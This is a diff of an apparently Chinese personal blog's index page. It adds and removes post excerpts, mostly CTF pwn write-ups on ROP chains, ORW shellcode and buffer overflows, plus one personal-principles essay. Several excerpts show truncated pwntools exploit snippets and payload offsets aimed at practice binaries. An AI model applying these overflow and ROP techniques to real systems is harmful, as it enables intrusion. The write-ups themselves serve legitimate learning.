@@ -232,6 +232,122 @@ log.success(&quot;canary------&gt;&quot; + hex(canary))
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/03/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/">
+        <p class="h4 index-header">ROPgadget&amp;系统调用-cmcc_simplerop</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">ROPgadget&amp;系统调用-cmcc_simplerop
+
+第一反应就是用ROPgadget自动生成ropchains
+但在这里不行，算出来的偏移是0x20，那么只有68字节给ropchains了
+
+而自动生成的都太长了= =，只能手动调整ropchains长度
+
+参考http://m4x.fun/post/hitcon-training-writeup/
+
+    from struct import pack 
+
+    pop_edx_ecx_ebx = 0x0806e850
+    payload = cyclic(0x14 + 12) 
+
+    p = lambda x : pack(&#39;I&#39;, x)
+    IMAGE_BASE_0 = 0x08048000 # ./simplerop
+    rebase_0 = lambda x : p(x + IMAGE_BASE_0)
+
+    rop = &#39;&#39;
+    rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
+    </div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-03&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
+          
+            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/-ROPgadget%20-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7">-ROPgadget -系统调用号</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/02/03/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/">
+        <p class="h4 index-header">ORW-[极客大挑战2019]Not_Bad</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">ORW-[极客大挑战2019]Not_Bad
+RWX
+
+Linux的文件和目录的权限，有RWX三种。
+r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限。
+w(Write,写入)：对文件而言，具有新增,修改,删除文件内容的权限；对目录来说，具有新建，删除，修改，移动目录内文件的权限。
+x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限
+
+
+
+什么是seccomp
+用seccomp-tools检测一下seccomp-tools dump  ./bad
+
+可运行open,read,write，也就是ORW
+关键点
+
+void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);
+
+mmap()函数的主要用途有三个：1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能；2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；3、为无关联的进程提供共</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-03&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
+          
+            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/-Shellcode%20-ORW">-Shellcode -ORW</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/02/01/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/">
         <p class="h4 index-header">堆之UAF(Use_after_free)及调试-hitcontraining_uaf</p>
         
@@ -445,6 +561,46 @@ malloc(8)申请到的堆块总大小为 16 + 8 + 8 + 1 = 0x21
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/28/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/">
+        <p class="h4 index-header">个人原则宪法</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">个人原则宪法史蒂芬.柯维提出，以原则为导向是以终为始最有效的方法。
+
+李源在解读查理.芒格时说，芒格的思维方式解决了他一直以来困惑的“愚人船”命题——一群人在船舱里掌舵，但他们看不清前方；另一群人在岸上，他们能看见一切，想要为船指引方向，但是无论他们如何叫喊，船里的人都听不见。生活就像一艘愚人船，掌舵人代表过去的我们，岸上的人代表现在的我们。现在我们了解过去，却无法为过去的我们指引方向。芒格不仅是成功的投资大师，更是生活的智者，他总结了一系列“为”与“不为”的清单，作为自己的投资原则。
+作者：土月君链接：https://www.jianshu.com/p/7cd520b68d5e来源：简书
+
+1.保持忠诚，不出轨，不搞暧昧，矛盾冲突通过有效沟通解决。
+2.保持冷静，在愤怒的时候，不出口伤人，不动手伤人，保持深呼吸，直至缓解。
+3.保持学习，尊崇内心的追寻和梦想，不卑不亢，独立思考。
+4.保持爱心，珍惜所拥有的东西，尽可能做到节约。
+5.开源节流，不花无意义的钱，购物前都思考是否必要，是否必须，尽早达到退休存款的4.2%为年开销。
+6.享受生活，享受人生，高光时期不高傲，低谷时期不绝望，</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-28&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/-%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95">-个人原则宪法</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/01/24/ciscn_2019_s_9/">
         <p class="h4 index-header">ciscn_2019_s_9</p>
         
@@ -491,168 +647,6 @@ payload = shellcode.ljust(0x24,&quot</div>
             <a href="/categories/CTF">CTF</a>&nbsp;
           
             <a href="/categories/buu">buu</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/">
-        <p class="h4 index-header">ciscn_2019_ne_5-骚骚的小东西</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">ciscn_2019_ne_5-骚骚的小东西
-
-输入之后，在调用getflag这里会造成溢出
-
-函数里调用有system，但没有/bin/sh
-骚东西：
-0x80482E6 + 0x4就是 sh
-我们可以system(“sh”)也可以
-exp:
-from pwn import *
-context.log_level = &#39;debug&#39;
-context.arch = &#39;i386&#39;
-#sh = process(&#39;ciscn_2019_ne_5&#39;)
-sh = remote(&quot;node3.buuoj.cn&quot;,27887)
-elf = ELF(&quot;./ciscn_2019_ne_5&quot;)
-lib = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
-
-pop_ret = 0x08048455
-sh.sendline(&quot;administrator&quot;)
-system = elf.plt[&#39;system&#39;]
-binsh = (0x80482</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-20&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/buu">buu</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/">
-        <p class="h4 index-header">ez_pz_hackover_2016-继续深入学习edb</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">ez_pz_hackover_2016-继续深入学习edb
-
-
-
-
-得先绕过result的strcmp
-sh.recvuntil(&quot;&gt;&quot;)
-payload = &quot;crashme&quot;
-payload = payload.ljust(10,&quot;\x00&quot;)
-payload += cyclic(200)
-pause()
-sh.sendline(payload)
-pause时，打开edb并attach ez_pz_hackover_2016
-我常用：f8单步运行，ctrl+f9直接跳到ret，shift+f7进入函数运行
-
-
-
-一直运行到不能运行
-
-计算得偏移为16。
-然后，一开始给出了&amp;s的地址，加上没有打开nx。我们就可以在memcpy，溢出之后，将返回指针指向&amp;s里的shellcode
-
-一直运行到vuln的ret之后，我们看见了返回地址时0xffb64b7c,然后我们的shellcode在0xffb64b60，所以偏移就是0xffb64b7c-0xffb64b60 = 0x1c 
-得exp
-from pwn </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-18&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
-          
-            <a href="/categories/buu">buu</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/16/Hgame/">
-        <p class="h4 index-header">Hgame</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">Hgame2020Hard_AAAAA
-
-V5在-0x31，s在-0xAC
-sh.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)
-payload=&quot;a&quot;*(0xAC - 0x31)
-payload += &#39;0O0o\x00O0&#39;
-sh.send(payload)
-sh.interactive()
-One_Shot
-
-0xE0 - 0xC0之后刚好是32位，这样第
-payload = cyclic(0xE0 - 0xC0)
-sh.send(payload)
-sh.recvuntil(&quot;shot!\n&quot;)
-payload = str(6295776)
-sh.send(payload)
-ROP_LEVEL0open_read_puts# -*- coding: utf-8 -*-
-from pwn import *
-context.log_level = &#39;debug&#39;
-context.arch = &#39;amd64&#39;
-elf = ELF(&#39;./ROP_LEVE</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-16&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/Hgame">Hgame</a>&nbsp;
           &nbsp;
         
         
